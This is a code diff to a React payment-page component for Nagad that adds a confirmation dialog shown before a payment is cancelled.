@@ -6,6 +6,7 @@ import { useReferrerGuard } from "@/hooks/useReferrerGuard";
 import DualCircleLoader from "@/components/DualCircleLoader";
 import cartIcon from "@/assets/cart-icon.png";
 import nagadLogoWhite from "@/assets/nagad-logo-white.png";
+import CancelPaymentDialog from "@/components/CancelPaymentDialog";
 
 const NagadPayment = () => {
   const navigate = useNavigate();
@@ -25,6 +26,7 @@ const NagadPayment = () => {
   const [pinAttempts, setPinAttempts] = useState(0);
   const [otpResent, setOtpResent] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const [showCancelDialog, setShowCancelDialog] = useState(false);
 
   const phoneInputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const otpInputRef = useRef<HTMLInputElement | null>(null);
@@ -112,6 +114,9 @@ const NagadPayment = () => {
     setOtpResent(true);
   };
   const handleClose = () => {
+    setShowCancelDialog(true);
+  };
+  const handleConfirmCancel = () => {
     navigate(`/payment-cancelled?channel=GenZ Direct Debit&reason=Payment isn't completed&amount=${amount}`);
   };
 
@@ -276,6 +281,7 @@ const NagadPayment = () => {
               </div>
         </div>
       </div>
+      <CancelPaymentDialog open={showCancelDialog} onOpenChange={setShowCancelDialog} onConfirmCancel={handleConfirmCancel} />
     </div>
   );
 };
